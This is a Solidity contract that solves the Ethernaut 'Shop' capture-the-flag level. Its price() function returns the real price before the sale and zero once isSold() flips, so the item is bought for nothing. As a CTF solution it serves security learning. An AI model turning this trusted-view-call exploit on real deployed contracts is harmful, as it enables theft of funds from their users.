// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
    function price() external view returns (uint256);
}

interface IShop {
    function price() external view returns (uint256);

    function isSold() external view returns (bool);

    function buy() external;
}

contract ShopExploit is IBuyer {
    IShop public implementation;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Shop` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0xCb1c7A4Dee224bac0B47d0bE7bb334bac235F842
    constructor(IShop _implementation) {
        implementation = _implementation;
    }

    /// @notice Manipulates price based on `isSold` status of shop
    function price() external view override returns (uint256) {
        return implementation.isSold() ? 0 : implementation.price();
    }

    /// @notice Buys the item from the `Shop` contract
    function exploit() external {
        implementation.buy();
    }
}
